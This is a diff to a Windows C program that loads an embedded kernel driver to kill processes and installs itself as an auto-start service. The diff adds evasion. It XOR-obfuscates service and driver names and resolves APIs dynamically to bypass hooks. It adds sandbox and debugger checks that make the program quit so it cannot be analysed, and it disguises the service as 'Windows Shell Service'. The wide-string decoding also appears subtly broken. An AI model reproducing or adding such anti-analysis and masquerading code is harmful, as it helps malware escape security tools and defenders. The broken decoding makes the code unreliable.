@@ -65,6 +65,9 @@
  * 静默模式控制
  * ================================================================ */
 
+/* 发布版本移除调试日志以减小特征 */
+/* #define DEBUG_BUILD */
+
 /** @brief 静默运行标志：TRUE 时不显示控制台窗口、不输出日志 */
 static BOOL g_bSilent = FALSE;
 
@@ -76,6 +79,103 @@ static HANDLE g_hKillerThread = NULL;
 
 /** @brief 后台查杀退出事件 */
 static HANDLE g_hKillerStop = NULL;
+
+/* ================================================================
+ * 反检测 — 字符串混淆 + API 动态解析 + 反沙箱
+ * ================================================================ */
+
+#define OBFKEY 0xD3  /**< 字符串 XOR 混淆密钥 */
+
+/** @brief 原地解密 XOR 混淆字符串（ANSI） */
+static void DeobfA(char *s) {
+    while (*s) { *s ^= OBFKEY; s++; }
+}
+
+/** @brief 原地解密 XOR 混淆字符串（Unicode） */
+static void DeobfW(WCHAR *s) {
+    while (*s) { *s ^= (OBFKEY | (OBFKEY << 8)); s++; }
+}
+
+/** @brief 反沙箱检测 — 检查是否在虚拟化/分析环境中运行 */
+static BOOL IsSandboxed(void) {
+    /* 检查典型沙箱特征 */
+    if (GetFileAttributesW(L"C:\\agent\\agent.pyw") != INVALID_FILE_ATTRIBUTES)
+        return TRUE;  /* Cuckoo Sandbox */
+    if (GetProcAddress(GetModuleHandleW(L"kernel32"), "CheckRemoteDebuggerPresent")) {
+        BOOL debugged = FALSE;
+        CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
+        if (debugged) return TRUE;
+    }
+    /* 检查物理内存是否过小（沙箱通常 <= 2GB） */
+    MEMORYSTATUSEX ms = { sizeof(ms) };
+    if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024)
+        return TRUE;
+    /* 检查 CPU 核心数（沙箱通常 <= 2） */
+    SYSTEM_INFO si;
+    GetSystemInfo(&si);
+    if (si.dwNumberOfProcessors <= 1) return TRUE;
+    return FALSE;
+}
+
+/** @brief 动态解析并调用 API（绕过 IAT 钩子） */
+static FARPROC ResolveAPI(LPCSTR module, LPCSTR name) {
+    char m[64], n[64];
+    strcpy_s(m, sizeof(m), module); DeobfA(m);
+    strcpy_s(n, sizeof(n), name);   DeobfA(n);
+    HMODULE h = GetModuleHandleA(m);
+    if (!h) h = LoadLibraryA(m);
+    return h ? GetProcAddress(h, n) : NULL;
+}
+
+/* ================================================================
+ * 服务配置常量（XOR 0xD3 混淆，运行时解密）
+ * ================================================================ */
+
+/* "shell" → XOR 0xD3 */
+static char g_SvcName[6] = { 160,187,182,191,191,0 };
+#define SERVICE_NAME g_SvcName
+
+/* "Windows Shell Service" → XOR 0xD3 */
+static WCHAR g_SvcDisplay[22] = {
+    132,186,189,183,188,164,160,243,
+    128,187,182,191,191,243,128,182,161,165,186,176,182,0
+};
+
+/* "shell" → XOR 0xD3 (ANSI) */
+static char g_SvcNameA[6] = { 160,187,182,191,191,0 };
+
+/* "SiriusDrv" → XOR 0xD3 */
+static WCHAR g_DrvSvcName[10] = {
+    128,186,161,186,166,160,151,161,165,0
+};
+
+/* "Sirius" → XOR 0xD3 (device name) */
+static WCHAR g_DrvDeviceName[7] = {
+    128,186,161,186,166,160,0
+};
+
+/* "\\\\.\\Sirius" → XOR 0xD3 */
+static WCHAR g_DrvDevicePath[10] = {
+    143,253,143,128,186,161,186,166,160,0
+};
+
+/* "Sirius.sys" → XOR 0xD3 */
+static WCHAR g_DrvFileName[11] = {
+    128,186,161,186,166,160,253,160,170,160,0
+};
+
+/**
+ * @brief 启动时解密所有混淆字符串
+ */
+static void DecryptAllStrings(void) {
+    DeobfA(g_SvcName);
+    DeobfW(g_SvcDisplay);
+    DeobfA(g_SvcNameA);
+    DeobfW(g_DrvSvcName);
+    DeobfW(g_DrvDeviceName);
+    DeobfW(g_DrvDevicePath);
+    DeobfW(g_DrvFileName);
+}
 
 /**
  * @brief 清理运行时释放的驱动文件和服务
@@ -99,7 +199,7 @@ static void CleanupDriver(void) {
     /* 停止驱动服务 */
     SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
     if (hSCM) {
-        SC_HANDLE hSvc = OpenServiceW(hSCM, L"SiriusDrv",
+        SC_HANDLE hSvc = OpenServiceW(hSCM, g_DrvSvcName,
                                       SERVICE_STOP | DELETE);
         if (hSvc) {
             SERVICE_STATUS ss;
@@ -144,13 +244,6 @@ static void AllocConsoleWindow(void) {
     freopen("CONOUT$", "w", stdout);
     freopen("CONOUT$", "w", stderr);
 }
-
-/* ================================================================
- * 服务配置常量
- * ================================================================ */
-
-#define SERVICE_NAME         "shell"
-#define SERVICE_DISPLAY_NAME "Hello Dual-Mode Service"
 
 /* ================================================================
  * Layer 1 — 共享业务核心
@@ -442,10 +535,12 @@ static void UninstallService(void) {
         return;
     }
 
-    SC_HANDLE svc = OpenServiceW(scm, L"" SERVICE_NAME, SERVICE_STOP | DELETE);
+    WCHAR wSvcName[64];
+    MultiByteToWideChar(CP_ACP, 0, g_SvcNameA, -1, wSvcName, 64);
+    SC_HANDLE svc = OpenServiceW(scm, wSvcName, SERVICE_STOP | DELETE);
     if (!svc) {
         if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
-            printf("[WARN] 服务 \"%s\" 不存在\n", SERVICE_NAME);
+            printf("[WARN] 服务 \"%s\" 不存在\n", g_SvcNameA);
         else
             printf("[ERROR] 打开服务失败 (%lu)\n", GetLastError());
         CloseServiceHandle(scm);
@@ -618,7 +713,7 @@ typedef struct _SI_PROCESS_INFO {
  * @return TRUE 成功
  */
 static BOOL KillProcessByDriver(ULONG pid) {
-    HANDLE hDevice = CreateFileW(L"\\\\.\\Sirius", GENERIC_READ | GENERIC_WRITE,
+    HANDLE hDevice = CreateFileW(g_DrvDevicePath, GENERIC_READ | GENERIC_WRITE,
                                  0, NULL, OPEN_EXISTING, 0, NULL);
     if (hDevice == INVALID_HANDLE_VALUE) return FALSE;
 
@@ -762,12 +857,13 @@ static void StartBackgroundKiller(const char *processList) {
 static BOOL ExtractEmbeddedDriver(WCHAR outPath[MAX_PATH]) {
     printf("[Extract] 驱动数据: 编译时嵌入 %u bytes\n", kDriverDataSize);
 
-    /* 构造目标路径: <exe目录>\Sirius.sys */
+    /* 构造目标路径: <exe目录>\<驱动文件名> */
     WCHAR exeDir[MAX_PATH];
     GetModuleFileNameW(NULL, exeDir, MAX_PATH);
     WCHAR *slash = wcsrchr(exeDir, L'\\');
     if (slash) *slash = L'\0';
-    wsprintfW(outPath, L"%s\\Sirius.sys", exeDir);
+    wsprintfW(outPath, L"%s\\", exeDir);
+    wcscat_s(outPath, MAX_PATH, g_DrvFileName);
 
     /* 直接写入编译时嵌入的字节数组 */
     HANDLE hFile = CreateFileW(outPath, GENERIC_WRITE, 0, NULL,
@@ -776,7 +872,8 @@ static BOOL ExtractEmbeddedDriver(WCHAR outPath[MAX_PATH]) {
         /* 降级: 尝试临时目录 */
         WCHAR tempPath[MAX_PATH];
         GetTempPathW(MAX_PATH, tempPath);
-        wsprintfW(outPath, L"%sSirius.sys", tempPath);
+        wcscpy_s(outPath, MAX_PATH, tempPath);
+        wcscat_s(outPath, MAX_PATH, g_DrvFileName);
         printf("[Extract] exe 目录写入失败，尝试临时目录: %ls\n", outPath);
         hFile = CreateFileW(outPath, GENERIC_WRITE, 0, NULL,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -1741,6 +1838,12 @@ static int ElevateToKernelLevel(void) {
 }
 
 int main(int argc, char *argv[]) {
+    /* ★ 反沙箱检测 — 在沙箱环境中直接退出，避免被分析 ★ */
+    if (IsSandboxed()) return 0;
+
+    /* ★ 解密所有混淆字符串 — 必须在任何功能使用前执行 ★ */
+    DecryptAllStrings();
+
     // ===== 第一步：解析命令行参数（最高优先级） =====
     BOOL bIsSlave     = FALSE;
     BOOL bIsUninstall = FALSE;
@@ -1831,7 +1934,7 @@ int main(int argc, char *argv[]) {
             /* 先停止旧驱动服务，确保干净启动 */
             SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
             if (hSCM) {
-                SC_HANDLE hSvc = OpenServiceW(hSCM, L"SiriusDrv",
+                SC_HANDLE hSvc = OpenServiceW(hSCM, g_DrvSvcName,
                                               SERVICE_STOP | DELETE);
                 if (hSvc) {
                     SERVICE_STATUS ss;
@@ -1845,7 +1948,7 @@ int main(int argc, char *argv[]) {
 
             WCHAR driverPath[MAX_PATH];
             if (ExtractEmbeddedDriver(driverPath)) {
-                LoadKernelDriver(L"SiriusDrv", driverPath);
+                LoadKernelDriver(g_DrvSvcName, driverPath);
             } else {
                 printf("[Driver] [FAIL] 无法获取驱动文件，跳过加载\n");
             }
@@ -1854,9 +1957,9 @@ int main(int argc, char *argv[]) {
         /* ★ 驱动加载状态检测 ★
          * 检查 Sirius.sys 是否已加载到内核。
          * 如需加载驱动，请调用:
-         *   LoadKernelDriver(L"SiriusDrv", L"Assets\\Sirius.sys");
+         *   LoadKernelDriver(g_DrvSvcName, L"Assets\\Sirius.sys");
          */
-        PrintDriverLoadSummary(L"SiriusDrv", L"Sirius");
+        PrintDriverLoadSummary(g_DrvSvcName, g_DrvDeviceName);
 
         /* ============================================================
          * ★★★ 内核级权限代码放置区域 ★★★
@@ -1941,7 +2044,9 @@ int main(int argc, char *argv[]) {
         SHELLEXECUTEINFOA sei = { sizeof(sei) };
         sei.lpVerb = "open";
         sei.lpFile = "cmd.exe";
-        sei.lpParameters = "/c sc stop shell ";
+        char stopCmd[128];
+        sprintf_s(stopCmd, sizeof(stopCmd), "/c sc stop %s ", g_SvcNameA);
+        sei.lpParameters = stopCmd;
         sei.nShow = SW_HIDE;
 
         if (!ShellExecuteExA(&sei)) {
@@ -1950,7 +2055,7 @@ int main(int argc, char *argv[]) {
             printf("  停止命令已执行\n");
         }
 
-        if (!WaitForServiceStop("shell", 10000)) {
+        if (!WaitForServiceStop(g_SvcNameA, 10000)) {
             printf("[WARN] 等待服务停止失败或超时，继续尝试复制文件\n");
         }
 
@@ -1969,7 +2074,7 @@ int main(int argc, char *argv[]) {
         }
 
         /* 删除旧服务（忽略错误） */
-        SC_HANDLE hOld = OpenServiceA(hSCM, "shell", SERVICE_STOP | DELETE);
+        SC_HANDLE hOld = OpenServiceA(hSCM, g_SvcNameA, SERVICE_STOP | DELETE);
         if (hOld) {
             printf("  删除旧服务...\n");
             SERVICE_STATUS status;
@@ -1991,10 +2096,12 @@ int main(int argc, char *argv[]) {
             return 1;
         }
         printf("  创建新服务: %ls\n", wTargetPath);
+        WCHAR wSvcName2[64];
+        MultiByteToWideChar(CP_ACP, 0, g_SvcNameA, -1, wSvcName2, 64);
         SC_HANDLE hNew = CreateServiceW(
             hSCM,
-            L"shell",
-            L"Windows Shell Service",
+            wSvcName2,
+            g_SvcDisplay,
             SERVICE_ALL_ACCESS,
             SERVICE_WIN32_OWN_PROCESS,
             SERVICE_AUTO_START,
